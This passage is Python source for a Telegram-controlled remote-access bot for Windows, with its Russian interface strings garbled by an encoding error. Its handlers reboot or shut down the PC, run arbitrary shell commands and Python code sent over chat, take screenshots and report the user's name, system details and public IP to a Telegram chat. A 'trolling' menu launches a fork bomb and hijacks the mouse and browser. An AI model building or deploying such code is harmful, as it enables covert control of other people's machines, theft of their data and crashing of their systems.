    item3 = types.KeyboardButton("–§–∏–∫—Å —Ä–∞–∑–¥–≤–æ–µ–Ω–∏—è")
    item4 = types.KeyboardButton("–í—ã—Ö–æ–¥ –∏–∑ —Å–∫—Ä–∏–ø—Ç–∞")
    item5 = types.KeyboardButton("–£–¥–∞–ª–µ–Ω–∏–µ –ø–∞–ø–∫–∏ —Å–æ —Å–∫—Ä–∏–ø—Ç–æ–º")
    markup.add(item0, item1, item2, item3, item4, item5, types.KeyboardButton("–ù–∞–∑–∞–¥"))
    bot.send_message(message.chat.id, 'üîë *–í—ã–±–µ—Ä–∏—Ç–µ –Ω—É–∂–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_other)


def check_other(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return mainmenu(message)
    elif message.text.strip() == '–£–¥–∞–ª–µ–Ω–∏–µ –ø–∞–ø–∫–∏ —Å–æ —Å–∫—Ä–∏–ø—Ç–æ–º': return full_delete(message)
    elif message.text.strip() == '–í—ã—Ö–æ–¥ –∏–∑ —Å–∫—Ä–∏–ø—Ç–∞': return script_exit(message)
    elif message.text.strip() == '–í—ã—Ö–æ–¥ –∏–∑ —É—á–µ—Ç–∫–∏ –ü–ö': return logout(message)
    elif message.text.strip() == '–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –ü–ö': return reboot(message)
    elif message.text.strip() == '–í—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö': return off_computer(message)
    elif message.text.strip() == '–§–∏–∫—Å —Ä–∞–∑–¥–≤–æ–µ–Ω–∏—è':
        bot.send_message(message.chat.id, 'üò¢ *–ù–µ –∑–∞–±—É–¥—å—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç—å /start*', parse_mode='Markdown')
        return 1/0
        
    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
    return other_functions(message)


def reboot(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é"), types.KeyboardButton("–ù–µ—Ç, —è –ø–µ—Ä–µ–¥—É–º–∞–ª"))

    bot.send_message(message.chat.id, 'üò¢ *–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É –ü–ö!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, reboot_check)

def reboot_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é':
        bot.send_message(message.chat.id, '‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã–∑–≤–∞–ª–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É –ü–ö\n–û–Ω–∞ –ø—Ä–æ–∏–∑–æ–π–¥–µ—Ç –ø–æ—Å–ª–µ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é*', parse_mode='Markdown')
        mainmenu()
        bot.send_message(message.chat.id, "‚òëÔ∏è *–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞!*")
        return subprocess.run('shutdown -r -t 0')

    bot.send_message(message.chat.id, 'üéâ *–í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É –ü–ö!*', parse_mode='Markdown')
    return other_functions(message)


def off_computer(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é"), types.KeyboardButton("–ù–µ—Ç, —è –ø–µ—Ä–µ–¥—É–º–∞–ª"))

    bot.send_message(message.chat.id, 'üò¢ *–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, off_computer_check)

def off_computer_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é':
        bot.send_message(message.chat.id, '‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã–∑–≤–∞–ª–∏ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö\n–û–Ω–æ –ø—Ä–æ–∏–∑–æ–π–¥–µ—Ç –ø–æ—Å–ª–µ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é*', parse_mode='Markdown')
        mainmenu()
        bot.send_message(message.chat.id, "‚òëÔ∏è *–í—ã–∫–ª—é—á–µ–Ω–∏–µ –∑–∞–ø—É—â–µ–Ω–æ!*")
        return subprocess.Popen('shutdown /s /t 0', shell=True)

    bot.send_message(message.chat.id, 'üéâ *–í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö!*', parse_mode='Markdown')
    return other_functions(message)


def logout(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é"), types.KeyboardButton("–ù–µ—Ç, —è –ø–µ—Ä–µ–¥—É–º–∞–ª"))

    bot.send_message(message.chat.id, 'üò¢ *–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤—ã—Ö–æ–¥ –∏–∑ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, logout_check)

def logout_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é':
        bot.send_message(message.chat.id, '‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã—à–ª–∏ –∏–∑ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏*', parse_mode='Markdown')
        return subprocess.run('shutdown /l')

    bot.send_message(message.chat.id, 'üéâ *–í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –≤—ã—Ö–æ–¥ –∏–∑ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏!*', parse_mode='Markdown')
    return other_functions(message)


def script_exit(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    item0=types.KeyboardButton("–î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é")
    item1=types.KeyboardButton("–ù–µ—Ç, —è –ø–µ—Ä–µ–¥—É–º–∞–ª")
    markup.add(item0, item1)

    bot.send_message(message.chat.id, 'üò¢ *–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_exit)

def check_exit(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é':
        bot.send_message(message.chat.id, 'üò• *–í—ã –∑–∞–≤–µ—Ä—à–∏–ª–∏ —Ä–∞–±–æ—Ç—É —Å–∫—Ä–∏–ø—Ç–∞!*', parse_mode='Markdown')
        return os.abort()

    bot.send_message(message.chat.id, 'üéâ *–í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã —Å–∫—Ä–∏–ø—Ç–∞!*', parse_mode='Markdown')
    return other_functions(message)


def packs(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    item0=types.KeyboardButton("–û—Ç–∫—Ä—ã—Ç–∏–µ —Å–∞–π—Ç–æ–≤")
    item1=types.KeyboardButton("–û—Ç–∫—Ä—ã—Ç–∏–µ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞")
    item2=types.KeyboardButton("–ü–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –º—ã—à–∫–∏")
    item3=types.KeyboardButton("start %0 %0")
    markup.add(item0, item1, item2, item3, types.KeyboardButton("–ù–∞–∑–∞–¥"))

    bot.send_message(message.chat.id, 'üë∫ *–í—ã –≤ –º–µ–Ω—é —Ç—Ä–æ–ª–ª–∏–Ω–≥–∞!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_packs)

def check_packs(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return mainmenu(message)
    elif message.text.strip() == 'start %0 %0':
        if os.path.exists('C:\\temp\\') == False: make_temp_folder()
        with open("C:\\temp\\troll.bat", "w") as file: file.write('start %0 %0')
        os.startfile("C:\\temp\\troll.bat")
        bot.send_message(message.chat.id, '‚òëÔ∏è *start %0 %0 —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!*', parse_mode='Markdown')
        return packs(message)

    elif message.text.strip() == '–û—Ç–∫—Ä—ã—Ç–∏–µ —Å–∞–π—Ç–æ–≤':
        bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ –≤—ã —Ö–æ—Ç–∏—Ç–µ –æ—Ç–∫—Ä—ã—Ç—å —Å–∞–π—Ç—ã!*', parse_mode='Markdown')
        return bot.register_next_step_handler(message, troll_site)
    elif message.text.strip() == '–û—Ç–∫—Ä—ã—Ç–∏–µ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞':
        bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ –≤—ã —Ö–æ—Ç–∏—Ç–µ –æ—Ç–∫—Ä—ã—Ç—å –ø—Ä–æ–≤–æ–¥–Ω–∏–∫!*', parse_mode='Markdown')
        return bot.register_next_step_handler(message, troll_provod)
    elif message.text.strip() == '–ü–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –º—ã—à–∫–∏':
        bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ —Å–µ–∫—É–Ω–¥ –≤—ã —Ö–æ—Ç–∏—Ç–µ –ø–µ—Ä–µ–º–µ—â–∞—Ç—å –º—ã—à—å!*', parse_mode='Markdown')
        return bot.register_next_step_handler(message, mouse_troll)

    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
    return packs(message)


def mouse_troll(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    xmouse = message.text.strip()
    if xmouse == "/start": return start(message)
    if xmouse.isdigit() == False:
        bot.send_message(message.chat.id, f'‚ùå *–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–∑ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º!*', parse_mode='Markdown')
        return packs(message)

    bot.send_message(message.chat.id, f'‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ –Ω–∞—á–∞–ª –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è {xmouse} —Å–µ–∫—É–Ω–¥!*', parse_mode='Markdown')
    packs(message)

    for i in range(int(xmouse)): 
        for i in range(10): pyautogui.moveTo(randint(0, width), randint(0, height), duration=0.10)
    
    return bot.send_message(message.chat.id, '‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –º—ã—à–∫–∏ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*', parse_mode='Markdown')



def troll_provod(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    xexplorer = message.text.strip()
    if xexplorer == "/start": return start(message)
    if xexplorer.isdigit() == False:
        bot.send_message(message.chat.id, f'‚ùå *–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–∑ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º!*', parse_mode='Markdown')
        return packs(message)

    bot.send_message(message.chat.id, f'‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ –Ω–∞—á–∞–ª –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è {xexplorer} —Ä–∞–∑!*', parse_mode='Markdown')
    packs(message)

    for i in range(int(xexplorer)): keyboard.send("win+e")
    return bot.send_message(message.chat.id, '‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –æ—Ç–∫—Ä—ã—Ç–∏–µ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*', parse_mode='Markdown')


def troll_site(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    xsite = message.text.strip()
    if xsite == "/start": return start(message)
    if xsite.isdigit() == False:
        bot.send_message(message.chat.id, f'‚ùå *–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–∑ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º!*', parse_mode='Markdown')
        return packs(message)

    bot.send_message(message.chat.id, f'‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ –Ω–∞—á–∞–ª –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è {xsite} —Ä–∞–∑!*', parse_mode='Markdown')
    packs(message)

    for i in range(int(xsite)):
        for i in TROLL_WEBSITES: webopen(i, new=1)

    return bot.send_message(message.chat.id, '‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –æ—Ç–∫—Ä—ã—Ç–∏–µ —Å–∞–π—Ç–æ–≤ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*', parse_mode='Markdown')


def full_delete(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    bot.send_message(message.chat.id, f"import shutil\n\nshutil.rmtree('{os.path.abspath(os.curdir)}')")
    return bot.register_next_step_handler(message, full_delete_open)

def full_delete_open(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == "/start": return start(message)
    if os.path.exists('C:\\temp') == False: make_temp_folder()
    with open("C:\\temp\\DeleteFile.py", "w", encoding="utf-8") as file: file.write(message.text.strip())
    subprocess.Popen("python C:\\temp\\DeleteFile.py", shell=True)
    return other_functions(message)


def pc_settings(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ò–∑–º–µ–Ω–∏—Ç—å —è—Ä–∫–æ—Å—Ç—å"), types.KeyboardButton("–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö"), types.KeyboardButton("–ù–∞–∑–∞–¥"))

    bot.send_message(message.chat.id, 'üîß *–í—ã –≤ –º–µ–Ω—é –Ω–∞—Å—Ç—Ä–æ–µ–∫ –ü–ö!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, pc_settings_check)

def pc_settings_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '–ù–∞–∑–∞–¥': return mainmenu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ò–∑–º–µ–Ω–∏—Ç—å —è—Ä–∫–æ—Å—Ç—å': return brightness_set(message)
    elif message.text.strip() == '–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö':
        conn = HTTPConnection("ifconfig.me")
        conn.request("GET", "/ip")
        ip = conn.getresponse().read()

        total_mem, used_mem, free_mem = disk_usage('.')
        gb = 10 ** 9
        login = os.getlogin()
        width, height = pyautogui.size()
        oper = uname()
            
        try: virtual_memory = psutil.virtual_memory()
        except: virtual_memory = '–Ω–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏'
        try: battery = psutil.sensors_battery()[0]
        except: battery = '–Ω–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏'
        active_window = getActiveWindowTitle()

        if active_window == None or active_window == '': active_window = '–†–∞–±–æ—á–∏–π —Å—Ç–æ–ª'
        bot.send_message(chat_id, f'üßê –ë–æ—Ç –±—ã–ª –≥–¥–µ-—Ç–æ –∑–∞–ø—É—â–µ–Ω! \n\n‚è∞ –¢–æ—á–Ω–æ–µ –≤—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞: *{startup_time}*\nüíæ –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - *{login}*\nü™ë –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ - *{oper[0]} {oper[2]} {oper[3]}*\nüßÆ –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä - *{oper[5]}*\nüòª –û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å: *–î–æ—Å—Ç—É–ø–Ω–æ {int(virtual_memory[0] / 1e+9)} –ì–ë | –ó–∞–≥—Ä—É–∂–µ–Ω–æ {virtual_memory[2]}%*\nüîã –ë–∞—Ç–∞—Ä–µ—è –∑–∞—Ä—è–∂–µ–Ω–∞ –Ω–∞ *{battery}%*\nüñ• –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞ - *{width}x{height}*\nüìÄ –ü–∞–º—è—Ç—å: ' + '*{:6.2f}* –ì–ë'.format(total_mem/gb) + " –≤—Å–µ–≥–æ, –æ—Å—Ç–∞–ª–æ—Å—å *{:6.2f}* –ì–ë".format(free_mem/gb) + f'\nüîë IP –∞–¥—Ä–µ—Å –∑–∞–ø—É—Å—Ç–∏–≤—à–µ–≥–æ - *{str(ip)[2:-1]}*\n*üñº –ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ - {active_window}*', parse_mode="Markdown")
        return pc_settings(message)

    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
    return pc_settings(message)

def brightness_set(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))
    bot.send_message(message.chat.id, f'üîß *–í–≤–µ–¥–∏—Ç–µ —É—Ä–æ–≤–µ–Ω—å —è—Ä–∫–æ—Å—Ç–∏(5-100)!\n\n–¢–µ–∫—É—â–∏–π —É—Ä–æ–≤–µ–Ω—å - {get_brightness()}*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_brightness_set)

def check_brightness_set(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    level = message.text.strip()
    if level  == '–ù–∞–∑–∞–¥': return pc_settings(message)
    elif level == '/start': return start(message)
    elif message.text.strip().isdigit() == False:
        bot.send_message(message.chat.id, f'‚ùå *–£—Ä–æ–≤–µ–Ω—å —è—Ä–∫–æ—Å—Ç–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º!*', parse_mode='Markdown')
        return pc_settings(message)

    if int(level) < 0 or int(level) > 100: return bot.send_message(message.chat.id, f'‚ùå *–£—Ä–æ–≤–µ–Ω—å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –±–æ–ª—å—à–µ 0 –∏ –º–µ–Ω—å—à–µ 100!*', parse_mode='Markdown')
        
    set_brightness(int(level))
    bot.send_message(message.chat.id, f'‚ùå *–í—ã —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ —É—Ä–æ–≤–µ–Ω—å —è—Ä–∫–æ—Å—Ç–∏ {level}!*', parse_mode='Markdown')
    return pc_settings(message)

#–ë–∏–Ω–¥ API
class bindAPI:
    def setWait(self, duration):
        try: sleep(int(duration))
        except: return bot.send_message(chat_id, f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –±–∏–Ω–¥–∞! *–§—É–Ω–∫—Ü–∏—è setWait, –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–¥–µ—Ä–∂–∫–∏ = {duration}*", parse_mode='Markdown')

    def setCursor(self, x, y):
        try: pyautogui.moveTo(int(x), int(y))
        except: return bot.send_message(chat_id, f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –±–∏–Ω–¥–∞! *–§—É–Ω–∫—Ü–∏—è setCursor, x = {x}, y = {y}*", parse_mode='Markdown')

    def writeKeyboard(self, text):
        try: keyboard.write(text, 0)
        except: return bot.send_message(chat_id, f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –±–∏–Ω–¥–∞! *–§—É–Ω–∫—Ü–∏—è writeKeyboard, —Ç–µ–∫—Å—Ç = {text}*", parse_mode='Markdown')

    def useKeyboard(self, combination):
        try: keyboard.send(combination)
        except: return bot.send_message(chat_id, f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –±–∏–Ω–¥–∞! *–§—É–Ω–∫—Ü–∏—è useKeyboard, –∫–æ–º–±–∏–Ω–∞—Ü–∏—è = {combination}*", parse_mode='Markdown')

    def openSite(self, site):
        try: webopen(site)
        except: return bot.send_message(chat_id, f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –±–∏–Ω–¥–∞! *–§—É–Ω–∫—Ü–∏—è openSite, —Å–∞–π—Ç = {site}*", parse_mode='Markdown')

    def sendMessage(self, sendId, text):
        try: bot.send_message(sendId, text)
        except: return bot.send_message(chat_id, f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –±–∏–Ω–¥–∞! *–§—É–Ω–∫—Ü–∏—è sendMessage, sendId = {sendId}, —Ç–µ–∫—Å—Ç - {text}*", parse_mode='Markdown')

    def openProgram(self, path):
        try: subprocess.Popen(f"start {path}")
        except FileNotFoundError: return bot.send_message(chat_id, f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –±–∏–Ω–¥–∞! *–§—É–Ω–∫—Ü–∏—è openProgram, path = {path}*, —Ñ–∞–π–ª –Ω–µ –±—ã–ª –Ω–∞–π–¥–µ–Ω", parse_mode='Markdown')
    

    def clickMouse(self, button):
        try:
            if button == 'r': pyautogui.click(button='right')
            elif button == 'l': pyautogui.click()
            else: return bot.send_message(chat_id, f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –±–∏–Ω–¥–∞: –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–Ω–æ–ø–∫–∞! –î–æ—Å—Ç—É–ø–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã - r –∏–ª–∏ l\n*–§—É–Ω–∫—Ü–∏—è clickMouse, button = {button}*", parse_mode='Markdown')

        except: return bot.send_message(chat_id, f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –±–∏–Ω–¥–∞! *–§—É–Ω–∫—Ü–∏—è clickMouse, button = {button}*", parse_mode='Markdown')

    def sendScreenshot(self, sendId):
        try:
            pyautogui.screenshot("screen.png")
            bot.send_document(sendId, open("screen.png", 'rb'))
        except: return bot.send_message(chat_id, f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –±–∏–Ω–¥–∞! *–§—É–Ω–∫—Ü–∏—è sendScreenshot, sendId = {sendId}*", parse_mode='Markdown')

    def useConsole(self, sendId, cmd):
        try:
            if int(sendId) >= 1: bot.send_message(sendId, subprocess.getoutput(cmd, encoding='cp866'))
            else: subprocess.Popen(cmd, shell=True)
        except: return bot.send_message(chat_id, f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –±–∏–Ω–¥–∞! *–§—É–Ω–∫—Ü–∏—è useConsole, –∫–æ–º–∞–Ω–¥–∞ = {cmd}, sendId = {sendId}*", parse_mode='Markdown')


def bind_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–∏–Ω–¥"), types.KeyboardButton("–£–¥–∞–ª–∏—Ç—å –±–∏–Ω–¥"), types.KeyboardButton("–ù–∞–∑–∞–¥"))
    bot.send_message(message.chat.id, 'üòè *–í—ã –≤ –º–µ–Ω—é –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –±–∏–Ω–¥–æ–≤!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_bind_menu)

def check_bind_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start' or message.text.strip() == '–ù–∞–∑–∞–¥': return mainmenu(message)
    elif message.text.strip() == '–£–¥–∞–ª–∏—Ç—å –±–∏–Ω–¥': return bind_delete(message)
    elif message.text.strip() == '–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–∏–Ω–¥': return choose_bind(message)

    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
    return bind_menu(message)


def bind_delete(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))
    bot.send_message(message.chat.id, 'üòè *–í—ã –≤ –º–µ–Ω—é —É–¥–∞–ª–µ–Ω–∏—è –±–∏–Ω–¥–æ–≤!\n–í–≤–µ–¥–∏—Ç–µ –∏–º—è —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–≥–æ –±–∏–Ω–¥–∞ –¥–ª—è –µ–≥–æ —É–¥–∞–ª–µ–Ω–∏—è*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_bind_del)

def check_bind_del(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip == "/start": return start(message)
    elif message.text.strip == "–ù–∞–∑–∞–¥": return bind_menu(message)

    if os.path.isfile(f"binds\\{message.text.strip()}.txt"):
